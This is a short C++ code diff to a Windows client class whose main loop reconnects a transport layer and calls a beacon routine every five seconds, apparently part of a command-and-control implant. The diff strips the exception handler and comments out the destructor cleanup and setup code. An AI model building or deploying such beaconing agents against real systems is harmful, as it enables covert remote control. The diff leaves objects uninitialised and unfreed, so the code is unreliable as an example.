@@ -60,8 +60,10 @@ Client::Client(
 	messageHandler_.setTransportLayer(*transportLayerPtr_);
 }
 
+
 Client::~Client()
 {
+	/*
 	if (messageHandler_)
 	{
 		delete messageHandler_;
@@ -70,7 +72,7 @@ Client::~Client()
 	if (transportLayerFactory_)
 	{
 		delete transportLayerFactory_;
-	}
+	}*/
 }
 
 bool Client::run()
@@ -91,36 +93,28 @@ bool Client::run()
 
 	*/
 
-	__try
+	while (true)
 	{
-		while (true)
+		if (!transportLayerPtr_->isConnected())
 		{
-			if (!transportLayerPtr_->isConnected())
-			{
-				transportLayerPtr_->connect();
-			}
-
-			if (transportLayerPtr_->isConnected())
-			{
-				transportLayerPtr_->beacon();
-			}
-			std::cout << "before sleeping" << std::endl;
-			Sleep(5000);
-			std::cout << "after sleeping" << std::endl;
+			transportLayerPtr_->connect();
 		}
+
+		if (transportLayerPtr_->isConnected())
+		{
+			transportLayerPtr_->beacon();
+		}
+		Sleep(5000);
 	}
-	__except (EXCEPTION_EXECUTE_HANDLER)
-	{
-		std::cout << "CRITICAL: Exception in main loop: 0x" << std::hex << GetExceptionCode() << std::dec << std::endl;
-		// Try to reconnect or restart
-		return false;
-	}
+
 
 	return false;
 }
 
+/*
 void Client::setup()
 {
 	messageHandler_ = new MessageHandler();
 	transportLayerFactory_ = new TransportLayerFactory(*messageHandler_);
 }
+*/
